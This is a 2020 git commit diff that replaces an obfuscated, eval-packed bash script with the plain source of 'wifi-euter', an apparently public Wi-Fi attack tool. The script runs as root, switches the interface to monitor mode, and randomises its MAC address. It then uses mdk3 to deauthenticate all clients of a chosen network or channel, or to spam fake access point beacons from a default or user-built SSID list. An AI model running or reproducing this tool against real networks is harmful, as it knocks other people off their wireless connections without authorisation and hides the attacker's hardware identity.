60b7453640c6d2563106ce74975efcc38116d954
Jayson Cabrillas San Buenaventura <52001009+mkdirlove@users.noreply.github.com>
2020-07-19 12:20:42 +0800

    Update wifi-euter.sh

--- wifi-euter.sh
+++ wifi-euter.sh
@@ -1,3 +1,196 @@
-z="
-";NBz='███╗';xEz='d';kBz=' "  ';SFz='o ex';FGz='1" |';MGz='ce >';xGz=' "$r';aDz='e_ma';BCz='nter';PFz='### ';BEz='n2 (';CGz='[ $s';nGz='" SS';SDz='mode';dFz='|| $';LHz='!] I';JCz='rfac';oDz='ull ';VFz='d -n';pGz='ount';pDz='2>&1';OFz='XIT ';OBz='  ██';YCz='.ifa';tDz='ng i';JBz='╝╚══';sGz='eq 1';Kz='then';aCz='mp)';RFz='+C t';ZDz='up';jDz=' man';AEz='f .i';yz='║███';oBz='YSON';QFz='CTRL';uGz='n_ss';NDz='n ()';cFz='02" ';mCz='on $';aBz='╔══╝';fBz='╚═══';jz='"   ';UCz=''\'' | ';JGz='conn';fDz='/nul';aGz=' 100';XDz='er -';DGz='pm =';ZBz='═╝  ';VCz='tr -';aFz='ack ';FHz=' $ra';oz='╗███';lEz='[ $a';Vz='ipt ';bDz='slee';iCz='do';FCz=' " =';gCz='e.tm';cCz='for ';wBz='get_';OHz='nput';iEz=' " a';CBz='██╗█';cz='exit';bEz='els"';ZGz='a -s';JDz=')';VEz='th a';nz='█╗██';XGz='d_li';iFz='; th';eEz=' fak';XEz='lien';KHz='else';WGz=' ssi';cGz='$spm';DHz='.txt';qCz='+';oCz='let ';ADz=' -p ';YBz='╔╝  ';yGz=' $x"';MHz='nval';UDz='itor';REz='xt"';iz=' -e ';dGz='"02"';Iz='e 0 ';pBz=' CAB';sEz='"1" ';cDz='p 3';NEz='and_';yFz='list';YDz='r $i';wGz=' do';DDz=' " i';tFz='_lis';XCz=''\'' > ';sFz='ult ';QBz='██╔═';mFz='d -c';sDz='utti';wFz='om s';LDz='$'\'''\''';OEz='ssid';QHz='p 4';hGz='" En';FEz='vice';Jz=']]; ';uCz='ifi@';uFz='t"';fEz='e AP';KEz='null';AHz='$ran';LEz=' 2>&';KBz='╝ ╚═';jFz='en';fFz='ck =';wCz='r]─[';DCz=' Lis';gDz='l 2>';RGz='L+C ';rDz='*] P';EFz=']"';IDz='.tmp';Rz='RROR';vCz='eute';MCz='nfig';MFz='ce_m';vz='════';FFz='n >>';JEz='dev/';HBz='║██║';QCz='/[ \';gz='{';VGz='b -f';bGz='0';Mz='r';ZFz='$att';Cz='er()';uz='║██╔';UEz='Deau';vDz='mana';jEz='ttac';XBz='║   ';VDz='macc';LGz='$ifa';IHz='t.tx';IEz='>> /';hBz='  ╚═';rBz='AS S';bCz='con=';kz='    ';xCz='~]"';RCz='t].*';EDz='sed ';AFz='   [';HDz=''\'' .i';HEz='nect';hCz='p); ';QGz=' CTR';NHz='id I';KCz='e=$(';SCz='//;/';CHz='id"_';kCz=') %s';CFz='I-EU';xFz='sid_';GHz='nd_s';jCz=' "%s';TGz='xit';bBz='███╔';qBz='RILL';sz='██║ ';tGz=' $co';BDz='" └─';GCz='====';HCz='="';SBz='║╚══';Wz='must';SEz='er';uDz=' in ';kGz=': " ';sCz='  " ';Tz='This';GEz=' con';TDz=' mon';ZCz='ce.t';IFz='ll 2';DEz='nmcl';GDz=''\''q;d';pCz='con+';rFz='defa';yBz='e ()';ABz=' ██║';eCz=' $(c';cBz='╝   ';Az='supe';kFz='_chn';qDz=' " [';Yz='run ';QEz='st.t';WEz='ll c';lBz='CODE';hz=' ""';UGz='p 2';LBz='╝╚═╝';BGz='pm';WBz='█╗  ';uBz='VENT';HGz='= "1';mz='   █';rEz=' == ';Dz=' {';Fz='[ "$';yDz='rm -';ez='}';IGz=' dis';IBz=' ╚══';tBz='UENA';cEz='03] ';nFz='chnl';GFz=' /de';PBz='╗   ';mBz='D BY';wDz='ged ';RDz='iwco';GBz='╔╝██';eBz='█║  ';NCz=' -a ';Hz='" -n';TCz='^$/d';dBz='║  █';nBz=': JA';XFz='elif';DBz='══╝ ';fz='1() ';iBz='═╝╚═';dEz='Spam';Pz='echo';uEz='v wi';kDz='aged';KDz='IFS=';tEz=' "$"';pEz=' $at';EEz='i de';lGz='rand';WDz='hang';xBz='ifac';AGz=' " s';dDz=' >> ';az='oot.';SGz='to e';nEz=' "01';kEz='k';lDz='up >';mGz=' -P ';YGz='xt -';yCz='read';vBz='URA"';GGz='| $s';FBz='╔███';ZEz='02] ';PHz=' ...';MBz=' ╚═╝';YEz='ts"';sBz='AN B';hFz='" ]]';eDz='/dev';tz='█║██';lCz='" $c';TBz='═╝██';TFz='it';xDz='..."';qGz='con_';gBz='╚═╝ ';rCz='done';Ez='if [';BHz='d_ss';PDz='ace ';lz='██╗ ';jGz='SSID';EGz='= "0';BFz=' WIF';aEz='hann';NFz='an E';wEz='_ssi';DFz='TER ';NGz='an2 ';LFz=' ifa';WCz='d '\'':';gGz='$AD ';iGz='ter ';PEz='"_li';fCz='at .';oEz='" ||';CCz='face';Gz='EUID';nCz='x';Lz='clea';PCz='d '\''s';fGz='"2" ';qz='╗██╗';HFz='v/nu';gFz='= "2';Bz='r_us';yEz='e';dz='fi';qFz='Use ';JHz='t" -';EHz='wait';qEz='tack';Sz='!!! ';OGz='EXIT';EBz='╚███';UFz='mdk3';VBz='╔══█';LCz='ifco';UBz='╔═══';hDz='&1';FDz=''\'''\''$i';TEz='01] ';ICz='inte';eGz=' || ';KGz='ect ';HHz='sid"';rz=' "';dCz='x in';wz='╝██║';Zz='as r';tCz='┌─[w';ECz='t "';vFz='cust';iDz='p $i';Qz=' " E';JFz='>&1';Xz=' be ';YFz=' [[ ';mDz='> /d';hEz='Exit';WFz='tck_';lFz='l';CDz='─╼ #';bFz='== "';rGz=' $(s';BBz='██║█';Nz='logo';mEz='k ==';OCz='| se';ODz=' $if';Uz=' scr';eFz='atta';jBz='╝  ╚';vGz='id);';oFz='03" ';RBz='═══╝';CEz=') {';Oz='1';gEz='00] ';nDz='ev/n';pFz='= "3';pz='████';PGz=' ###';xz='█╗ █';oGz='ID c';vEz='ttck';ACz=' " I';MDz='e_mo';MEz='f $r';bz='"';QDz='down';KFz='trap';
-eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$Iz$Jz$Kz$z$Lz$Mz$z$Nz$Oz$z$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$z$cz$z$dz$z$ez$z$Nz$fz$gz$z$Lz$Mz$z$Pz$hz$z$Pz$iz$jz$kz$kz$kz$kz$kz$lz$mz$nz$oz$pz$qz$kz$kz$kz$kz$rz$z$Pz$iz$jz$kz$kz$kz$kz$kz$sz$mz$tz$uz$vz$wz$kz$kz$kz$kz$rz$z$Pz$iz$jz$kz$kz$kz$kz$kz$sz$xz$tz$yz$lz$ABz$kz$kz$kz$kz$rz$z$Pz$iz$jz$kz$kz$kz$kz$kz$BBz$CBz$tz$uz$DBz$ABz$kz$kz$kz$kz$rz$z$Pz$iz$jz$kz$kz$kz$kz$kz$EBz$FBz$GBz$HBz$kz$ABz$kz$kz$kz$kz$rz$z$Pz$iz$jz$kz$kz$kz$kz$kz$IBz$JBz$KBz$LBz$kz$MBz$kz$kz$kz$kz$rz$z$Pz$iz$jz$kz$kz$kz$pz$NBz$lz$OBz$oz$pz$nz$pz$nz$pz$PBz$kz$rz$z$Pz$iz$jz$kz$kz$kz$QBz$RBz$sz$OBz$SBz$QBz$TBz$UBz$TBz$VBz$WBz$kz$rz$z$Pz$iz$jz$kz$kz$kz$pz$WBz$sz$OBz$XBz$sz$OBz$NBz$OBz$pz$YBz$kz$rz$z$Pz$iz$jz$kz$kz$kz$QBz$ZBz$sz$OBz$XBz$sz$OBz$aBz$OBz$VBz$WBz$kz$rz$z$Pz$iz$jz$kz$kz$kz$pz$NBz$EBz$bBz$cBz$sz$OBz$pz$nz$dBz$eBz$kz$rz$z$Pz$iz$jz$kz$kz$kz$fBz$RBz$IBz$RBz$kz$gBz$hBz$vz$iBz$jBz$ZBz$kz$rz$z$Pz$hz$z$Pz$kBz$kz$kz$kz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$z$Pz$hz$z$Pz$hz$z$ez$z$wBz$xBz$yBz$Dz$z$Pz$ACz$BCz$CCz$DCz$ECz$z$Pz$FCz$GCz$GCz$GCz$HCz$z$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$XCz$YCz$ZCz$aCz$z$bCz$Oz$z$cCz$dCz$eCz$fCz$xBz$gCz$hCz$iCz$z$Pz$jCz$kCz$lCz$mCz$nCz$z$oCz$pCz$qCz$z$rCz$z$Pz$sCz$tCz$uCz$vCz$wCz$xCz$z$yCz$ADz$BDz$CDz$DDz$CCz$z$xBz$KCz$EDz$FDz$CCz$GDz$HDz$CCz$IDz$JDz$z$KDz$LDz$z$ez$z$xBz$MDz$NDz$Dz$z$LCz$MCz$ODz$PDz$QDz$z$RDz$MCz$ODz$PDz$SDz$TDz$UDz$z$VDz$WDz$XDz$YDz$CCz$z$LCz$MCz$ODz$PDz$ZDz$z$ez$z$xBz$aDz$NDz$Dz$z$Lz$Mz$z$bDz$cDz$z$LCz$MCz$ODz$PDz$QDz$dDz$eDz$fDz$gDz$hDz$z$VDz$WDz$XDz$iDz$CCz$dDz$eDz$fDz$gDz$hDz$z$RDz$MCz$ODz$PDz$SDz$jDz$kDz$dDz$eDz$fDz$gDz$hDz$z$LCz$MCz$ODz$PDz$lDz$mDz$nDz$oDz$pDz$z$Lz$Mz$z$Nz$Oz$z$Pz$qDz$rDz$sDz$tDz$BCz$CCz$uDz$vDz$wDz$SDz$xDz$z$yDz$AEz$CCz$IDz$z$cz$z$ez$z$xBz$aDz$BEz$CEz$z$Lz$Mz$z$bDz$cDz$z$LCz$MCz$ODz$PDz$QDz$dDz$eDz$fDz$gDz$hDz$z$VDz$WDz$XDz$iDz$CCz$dDz$eDz$fDz$gDz$hDz$z$RDz$MCz$ODz$PDz$SDz$jDz$kDz$dDz$eDz$fDz$gDz$hDz$z$LCz$MCz$ODz$PDz$lDz$mDz$nDz$oDz$pDz$z$DEz$EEz$FEz$GEz$HEz$ODz$PDz$IEz$JEz$KEz$LEz$Oz$z$Lz$Mz$z$Nz$Oz$z$Pz$qDz$rDz$sDz$tDz$BCz$CCz$uDz$vDz$wDz$SDz$xDz$z$yDz$AEz$CCz$IDz$z$yDz$MEz$NEz$OEz$PEz$QEz$REz$z$cz$z$ez$z$Lz$Mz$z$Az$Bz$SEz$z$Nz$Oz$z$Pz$qDz$TEz$UEz$VEz$WEz$XEz$YEz$z$Pz$qDz$ZEz$UEz$VEz$WEz$aEz$bEz$z$Pz$qDz$cEz$dEz$eEz$fEz$bz$z$Pz$qDz$gEz$hEz$bz$z$Pz$hz$z$Pz$sCz$tCz$uCz$vCz$wCz$xCz$z$yCz$ADz$BDz$CDz$iEz$jEz$kEz$z$Lz$Mz$z$Ez$lEz$jEz$mEz$nEz$oEz$pEz$qEz$rEz$sEz$Jz$Kz$z$Nz$Oz$z$Pz$tEz$z$DEz$EEz$uEz$dz$z$Pz$sCz$tCz$uCz$vCz$wCz$xCz$z$yCz$ADz$BDz$CDz$iEz$vEz$wEz$xEz$z$Lz$Mz$z$Nz$Oz$z$wBz$xBz$yEz$z$Lz$Mz$z$Nz$Oz$z$Pz$kBz$kz$kz$kz$kz$kz$AFz$BFz$CFz$DFz$EFz$z$xBz$MDz$FFz$GFz$HFz$IFz$JFz$z$KFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$z$UFz$ODz$PDz$VFz$pEz$WFz$OEz$z$XFz$YFz$ZFz$aFz$bFz$cFz$dFz$eFz$fFz$gFz$hFz$iFz$jFz$z$Nz$Oz$z$DEz$EEz$uEz$dz$z$Pz$hz$z$Pz$sCz$tCz$uCz$vCz$wCz$xCz$z$yCz$ADz$BDz$CDz$iEz$vEz$kFz$lFz$z$Lz$Mz$z$Nz$Oz$z$wBz$xBz$yEz$z$Lz$Mz$z$Nz$Oz$z$Pz$kBz$kz$kz$kz$kz$kz$AFz$BFz$CFz$DFz$EFz$z$xBz$MDz$FFz$GFz$HFz$IFz$JFz$z$KFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$z$UFz$ODz$PDz$mFz$pEz$WFz$nFz$z$XFz$YFz$ZFz$aFz$bFz$oFz$dFz$eFz$fFz$pFz$hFz$iFz$jFz$z$Nz$Oz$z$wBz$xBz$yEz$z$Lz$Mz$z$Nz$Oz$z$Pz$qDz$TEz$qFz$rFz$sFz$OEz$tFz$uFz$z$Pz$qDz$ZEz$qFz$vFz$wFz$xFz$yFz$bz$z$Pz$hz$z$Pz$sCz$tCz$uCz$vCz$wCz$xCz$z$yCz$ADz$BDz$CDz$AGz$BGz$z$Ez$CGz$DGz$EGz$FGz$GGz$DGz$HGz$hFz$iFz$jFz$z$DEz$EEz$FEz$IGz$JGz$KGz$LGz$MGz$mDz$nDz$oDz$pDz$z$Lz$Mz$z$Nz$Oz$z$KFz$LFz$MFz$NGz$OGz$PGz$QGz$RGz$SGz$TGz$z$bDz$UGz$z$Pz$kBz$kz$kz$kz$kz$kz$AFz$BFz$CFz$DFz$EFz$z$LCz$MCz$ODz$PDz$QDz$z$VDz$WDz$XDz$YDz$CCz$dDz$eDz$fDz$gDz$hDz$z$RDz$MCz$ODz$PDz$SDz$TDz$UDz$z$LCz$MCz$ODz$PDz$ZDz$z$KFz$LFz$MFz$NGz$OGz$PGz$QGz$RGz$SGz$TGz$z$UFz$ODz$PDz$VGz$WGz$XGz$QEz$YGz$ZGz$aGz$bGz$z$XFz$YFz$cGz$rEz$dGz$eGz$cGz$rEz$fGz$Jz$Kz$z$bCz$Oz$z$DEz$EEz$FEz$IGz$JGz$KGz$gGz$mDz$nDz$oDz$pDz$z$Lz$Mz$z$Nz$Oz$z$yCz$ADz$hGz$iGz$jGz$kGz$lGz$wEz$xEz$z$yCz$mGz$nGz$oGz$pGz$kGz$qGz$OEz$z$cCz$dCz$rGz$sGz$tGz$uGz$vGz$wGz$z$Pz$xGz$NEz$OEz$yGz$dDz$AHz$BHz$CHz$yFz$DHz$bz$z$rCz$z$EHz$z$Lz$Mz$z$Nz$Oz$z$KFz$LFz$MFz$NGz$OGz$PGz$QGz$RGz$SGz$TGz$z$bDz$UGz$z$Pz$kBz$kz$kz$kz$kz$kz$AFz$BFz$CFz$DFz$EFz$z$LCz$MCz$ODz$PDz$QDz$z$VDz$WDz$XDz$YDz$CCz$dDz$eDz$fDz$gDz$hDz$z$RDz$MCz$ODz$PDz$SDz$TDz$UDz$z$LCz$MCz$ODz$PDz$ZDz$z$KFz$LFz$MFz$NGz$OGz$z$UFz$ODz$PDz$VGz$FHz$GHz$HHz$tFz$IHz$JHz$ZGz$aGz$bGz$z$KHz$z$Pz$qDz$LHz$MHz$NHz$OHz$PHz$bz$z$bDz$QHz$z$KFz$LFz$MFz$NGz$OGz$PGz$QGz$RGz$SGz$TGz$z$dz$z$KHz$z$Pz$qDz$LHz$MHz$NHz$OHz$PHz$bz$z$bDz$QHz$z$KFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$z$dz"
+#!/bin/bash
+
+# Check if running as root.
+super_user() {
+  if [[ "$EUID" -ne 0 ]]; then
+    clear
+    logo1
+    echo " ERROR!!! This script must be run as root." 
+    exit 
+  fi
+}
+
+# Logo or banner here
+logo1() {
+clear
+echo ""
+echo -e "                       ██╗    ██╗██╗███████╗██╗                 "    
+echo -e "                       ██║    ██║██║██╔════╝██║                 " 
+echo -e "                       ██║ █╗ ██║██║█████╗  ██║                 "
+echo -e "                       ██║███╗██║██║██╔══╝  ██║                 "
+echo -e "                       ╚███╔███╔╝██║██║     ██║                 "
+echo -e "                        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                 "                          
+echo -e "               ███████╗██╗   ██╗████████╗███████╗██████╗        "
+echo -e "               ██╔════╝██║   ██║╚══██╔══╝██╔════╝██╔══██╗       "
+echo -e "               █████╗  ██║   ██║   ██║   █████╗  ██████╔╝       "
+echo -e "               ██╔══╝  ██║   ██║   ██║   ██╔══╝  ██╔══██╗       "
+echo -e "               ███████╗╚██████╔╝   ██║   ███████╗██║  ██║       "
+echo -e "               ╚══════╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝       "
+echo ""
+echo "              CODED BY: JAYSON CABRILLAS SAN BUENAVENTURA"
+echo ""
+echo ""
+}
+
+# Function to get the interface
+get_iface () {
+	echo " Interface List "
+	echo " =============="
+	interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > .iface.tmp)
+	con=1
+	for x in $(cat .iface.tmp); do
+		echo "%s) %s" $con $x
+		let con++
+	done
+	echo  " ┌─[wifi@euter]─[~]" 
+	read -p " └──╼ # " iface
+	iface=$(sed ''$iface'q;d' .iface.tmp)
+	IFS=$''
+}
+
+# Function to enable changing to monitor mode
+iface_mon () {
+	ifconfig $iface down
+	iwconfig $iface mode monitor
+	# Change MAC Address
+	macchanger -r $iface
+	ifconfig $iface up
+}
+
+# Function to deactivate monitor mode
+iface_man () {
+	clear
+	sleep 3
+	ifconfig $iface down >> /dev/null 2>&1
+	macchanger -p $iface >> /dev/null 2>&1
+	iwconfig $iface mode managed >> /dev/null 2>&1
+	ifconfig $iface up >> /dev/null 2>&1
+	clear
+	logo1
+	echo " [*] Putting interface in managed mode..."
+	rm -f .iface.tmp
+	exit
+}
+
+iface_man2 () {
+	clear
+	sleep 3
+	ifconfig $iface down >> /dev/null 2>&1
+	macchanger -p $iface >> /dev/null 2>&1
+	iwconfig $iface mode managed >> /dev/null 2>&1
+	ifconfig $iface up >> /dev/null 2>&1
+	nmcli device connect $iface >> /dev/null 2>&1
+	clear
+	logo1
+	echo " [*] Putting interface in managed mode..."
+	rm -f .iface.tmp
+	rm -f $rand_ssid"_list.txt"
+	exit
+}
+
+### Menu ###
+clear
+super_user
+logo1
+echo " [01] Deauth all clients"
+echo " [02] Deauth all channels"
+echo " [03] Spam fake AP"
+echo " [00] Exit"
+echo ""
+echo  " ┌─[wifi@euter]─[~]" 
+read -p " └──╼ # " attack
+clear
+
+if [[ $attack == "01" || $attack == "1" ]]; then
+	logo1
+	echo "$"
+	nmcli dev wifi
+	echo  " ┌─[wifi@euter]─[~]" 
+	read -p " └──╼ # " attck_ssid
+	clear
+	logo1
+	get_iface
+	clear
+	logo1
+	echo "                         [ WIFI-EUTER ]"
+	
+	iface_mon >> /dev/null 2>&1
+	trap iface_man EXIT ### CTRL+C to exit
+	mdk3 $iface d -n $attck_ssid
+
+elif [[ $attack == "02" || $attack == "2" ]]; then
+	logo1
+	nmcli dev wifi
+	echo ""
+	echo  " ┌─[wifi@euter]─[~]"
+    read -p " └──╼ # " attck_chnl
+	clear
+	logo1
+	get_iface
+	clear
+	logo1
+	echo "                         [ WIFI-EUTER ]"
+	
+	iface_mon >> /dev/null 2>&1
+	trap iface_man EXIT ### CTRL+C to exit
+	mdk3 $iface d -c $attck_chnl
+
+elif [[ $attack == "03" || $attack == "3" ]]; then
+	logo1
+	get_iface
+	clear
+	logo1
+	echo " [01] Use default ssid_list"
+	echo " [02] Use custom ssid_list"
+	echo ""
+	echo  " ┌─[wifi@euter]─[~]" 
+	read -p " └──╼ # " spm
+	
+	if [[ $spm == "01" || $spm == "1" ]]; then
+		nmcli device disconnect $iface >> /dev/null 2>&1
+		clear
+		logo1
+		trap iface_man2 EXIT ### CTRL+C to exit
+		sleep 2
+		echo "                         [ WIFI-EUTER ]"
+		
+		ifconfig $iface down
+		macchanger -r $iface >> /dev/null 2>&1
+		iwconfig $iface mode monitor
+		ifconfig $iface up
+		trap iface_man2 EXIT ### CTRL+C to exit
+		mdk3 $iface b -f ssid_list.txt -a -s 1000
+	
+	elif [[ $spm == "02" || $spm == "2" ]]; then
+		con=1
+		nmcli device disconnect $AD > /dev/null 2>&1
+		clear
+		logo1
+		read -p " Enter SSID: " rand_ssid
+		read -P " SSID count: " con_ssid
+		for x in $(seq 1 $con_ssid); do
+			echo "$rand_ssid $x" >> $rand_ssid"_list.txt"
+		done
+		wait
+		clear
+		logo1
+		trap iface_man2 EXIT ### CTRL+C to exit
+		sleep 2
+		echo "                         [ WIFI-EUTER ]"
+		
+		ifconfig $iface down
+		macchanger -r $iface >> /dev/null 2>&1
+		iwconfig $iface mode monitor
+		ifconfig $iface up
+		trap iface_man2 EXIT
+		mdk3 $iface b -f $rand_ssid"_list.txt" -a -s 1000
+	else
+		echo " [!] Invalid Input ..."
+		sleep 4
+		trap iface_man2 EXIT ### CTRL+C to exit
+	fi
+else
+	echo " [!] Invalid Input ..."
+	sleep 4
+	trap iface_man EXIT ### CTRL+C to exit
+fi
